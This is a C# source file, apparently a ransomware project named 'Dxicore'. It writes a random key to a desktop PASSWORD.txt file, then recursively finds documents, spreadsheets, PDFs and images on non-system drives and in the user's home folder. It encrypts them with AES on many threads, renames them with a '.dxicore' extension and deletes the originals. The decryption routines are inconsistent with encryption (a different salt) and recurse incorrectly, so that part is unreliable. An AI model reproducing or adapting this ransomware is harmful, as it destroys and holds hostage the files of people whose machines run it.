using System.Security.Cryptography;
using System.Text;

namespace Dxicore.Encypt;

public class EncryptionProcess
{
    public static string key = GenerateRandomKey();

    //      Generate a Random Key       //
    public static string GenerateRandomKey()
    {
        int length = 99;
        const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
        StringBuilder res = new StringBuilder();
        Random rnd = new Random();
        while (0 < length--)
        {
            res.Append(valid[rnd.Next(valid.Length)]);
        }
        return res.ToString();
    }

    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
        byte[] encryptedBytes = null;
        byte[] saltBytes = passwordBytes;

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                using (CryptoStream cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                    cs.Close();
                }
                encryptedBytes = ms.ToArray();
            }
        }
        return encryptedBytes;
    }

    //      Encrypt Using AES       //
    public static void Encrypt(string file)
    {
        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] passwordBytes = Encoding.UTF8.GetBytes(key);
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
        byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

        string fileEncrypted = file + ".dxicore";
        Console.WriteLine(file + ".dxicore");
        try
        {
            File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            File.Delete(file);
        }
        catch
        {
            Console.WriteLine("error");

        }
    }

    public void encryptDirectory(string location)
    {
        DriveInfo[] drives = DriveInfo.GetDrives();
        string UserHomeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string[] extensions = { "*.pptx", "*.docx", "*.xlsx", "*.txt", "*.pdf", "*.500", "*.jpeg", "*.jpg", "*png" };
        foreach (DriveInfo drive in drives)
        {
            try
            {
                if (drive.Name == @"C:\")
                {
                    continue;
                }

                string dpath = drive.Name;
                Console.WriteLine(dpath);

                foreach (string l in extensions)
                {
                    try
                    {

                        foreach (string d in Directory.EnumerateDirectories(dpath))
                        {
                            try
                            {

                                foreach (string p in Directory.EnumerateFiles(d, l, SearchOption.AllDirectories))

                                    try
                                    {
                                        Thread t = new Thread(() => Encrypt(p));
                                        t.Priority = ThreadPriority.AboveNormal;
                                        t.Start();

                                    }
                                    catch (UnauthorizedAccessException)
                                    {
                                        continue;
                                    }

                            }
                            catch (UnauthorizedAccessException)
                            {
                                continue;
                            }
                            catch (Exception)
                            {
                                continue;
                            }

                        }
                        foreach (string p in Directory.EnumerateFiles(dpath, l))
                        {
                            try
                            {
                                Thread t = new Thread(() => Encrypt(p));
                                t.Priority = ThreadPriority.AboveNormal;
                                t.Start();
                            }
                            catch (UnauthorizedAccessException)
                            {
                                continue;
                            }

                        }
                    }
                    catch (Exception)
                    {
                        continue;
                    }

                }
            }
            catch (Exception)
            {
                continue;
            }
        }
        foreach (string l in extensions)
        {
            try
            {

                foreach (string d in Directory.EnumerateDirectories(UserHomeDir))
                {
                    try
                    {

                        foreach (string p in Directory.EnumerateFiles(d, l, SearchOption.AllDirectories))
                            try
                            {
                                Thread t = new Thread(() => Encrypt(p));
                                t.Priority = ThreadPriority.AboveNormal;
                                t.Start();

                            }
                            catch (UnauthorizedAccessException)
                            {

                                continue;
                            }
                            catch (ArgumentException)
                            {

                                continue;
                            }

                    }
                    catch (UnauthorizedAccessException)
                    {

                        continue;
                    }


                } //recursively list all the files in a drive
                foreach (string p in Directory.EnumerateFiles(UserHomeDir, l))
                {
                    try
                    {
                        Thread t = new Thread(() => Encrypt(p));
                        t.Priority = ThreadPriority.AboveNormal;
                        t.Start();
                    }
                    catch (UnauthorizedAccessException)
                    {

                        continue;
                    }

                }

            }
            catch (Exception)
            {

                continue;
            }

        }
    }

    public void startAction()
    {
        string UserHomeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        string path = $"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}/PASSWORD.txt";
        string fullpath = path;
        string[] lines = { key };
        System.IO.File.WriteAllLines(fullpath, lines);
        encryptDirectory(UserHomeDir);
    }

    //      Decrypt Using AES       //
    public byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
    {
        byte[] decryptedBytes = null;
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {

                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cs.Close();
                }
                decryptedBytes = ms.ToArray();


            }
        }

        return decryptedBytes;
    }

    public void DecryptFile(string file)
    {
        string rootDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string[] files = Directory.GetFiles(rootDirectory, "*", SearchOption.AllDirectories);

        foreach (string z in files)
        {
            byte[] bytesToBeDecrypted = File.ReadAllBytes(z);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(key);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            string extension = Path.GetExtension(z);
            string resultPath = Path.Combine(Path.GetDirectoryName(z), Path.GetFileNameWithoutExtension(z));

            try
            {
                string tempFile = Path.GetTempFileName();
                File.WriteAllBytes(tempFile, bytesDecrypted);
                File.Move(tempFile, resultPath + extension);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Dosya şifre çözümü sırasında bir hata oluştu: {0}", ex.Message);
            }
        }
    }

    public void DecryptDirectory()
    {
        string UserHomeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string[] files = Directory.GetFiles(UserHomeDir);
        string[] childDirectories = Directory.GetDirectories(UserHomeDir);
        for (int i = 0; i < files.Length; i++)
        {
            string extension = Path.GetExtension(files[i]);
            if (extension == ".dxicore")
            {
                DecryptFile(files[i]);
            }
        }
        for (int i = 0; i < childDirectories.Length; i++)
        {
            DecryptDirectory();
        }
    }
}
